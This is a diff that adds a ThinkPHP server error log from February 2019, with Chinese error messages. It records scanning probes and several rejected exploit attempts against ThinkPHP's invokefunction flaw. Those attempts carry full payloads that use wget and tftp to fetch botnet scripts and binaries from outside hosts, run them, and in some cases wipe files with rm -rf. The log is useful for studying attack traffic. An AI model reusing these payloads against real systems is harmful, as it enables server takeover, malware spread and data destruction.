@@ -1,0 +1,39 @@
+[ 2019-02-06T01:56:27+08:00 ] 31.41.89.237 /ncsi.txt
+ERR: 无法加载控制器:Ncsi.txt
+
+[ 2019-02-06T01:56:27+08:00 ] 31.41.89.237 /HNAP1/
+ERR: 无法加载控制器:HNAP1
+
+[ 2019-02-06T02:43:45+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.ga/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
+[ 2019-02-06T10:12:52+08:00 ] 117.3.69.247 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-02-06T11:07:54+08:00 ] 185.244.25.129 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://46.29.163.239/TunaIsGodbins.sh;%20chmod%20777%20TunaIsGodbins.sh;%20sh%20TunaIsGodbins.sh;%20tftp%2046.29.163.239%20-c%20get%20tunatftp1.sh;%20chmod%20777%20tunatftp1.sh;%20sh%20tunatftp1.sh;%20tftp%20-r%20tunatftp2.sh%20-g%2046.29.163.239;%20chmod%20777%20tunatftp2.sh;%20sh%20tunatftp2.sh;%20rm%20-rf%20TunaIsGodbins.sh%20tunatftp1.sh%20tunatftp2.sh;%20rm%20-rf%20*
+ERR: 非法操作:\think\app
+
+[ 2019-02-06T11:33:34+08:00 ] 49.51.197.209 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-02-06T11:36:50+08:00 ] 49.51.197.209 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-02-06T12:53:10+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/bins/x86;%20chmod%20777%20x86;./x86%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-06T13:22:52+08:00 ] 185.244.25.129 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://46.29.163.239/TunaIsGodbins.sh;%20chmod%20777%20TunaIsGodbins.sh;%20sh%20TunaIsGodbins.sh;%20tftp%2046.29.163.239%20-c%20get%20tunatftp1.sh;%20chmod%20777%20tunatftp1.sh;%20sh%20tunatftp1.sh;%20tftp%20-r%20tunatftp2.sh%20-g%2046.29.163.239;%20chmod%20777%20tunatftp2.sh;%20sh%20tunatftp2.sh;%20rm%20-rf%20TunaIsGodbins.sh%20tunatftp1.sh%20tunatftp2.sh;%20rm%20-rf%20*
+ERR: 非法操作:\think\app
+
+[ 2019-02-06T15:56:03+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.ga/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
+[ 2019-02-06T16:07:04+08:00 ] 3.81.76.184 /clientaccesspolicy.xml
+ERR: 无法加载控制器:Clientaccesspolicy.xml
+
+[ 2019-02-06T19:31:42+08:00 ] 194.147.32.109 /a2billing/customer/templates/default/footer.tpl
+ERR: 无法加载控制器:A2billing
+
+[ 2019-02-06T20:01:28+08:00 ] 194.147.32.109 /recordings/
+ERR: 无法加载控制器:Recordings
+
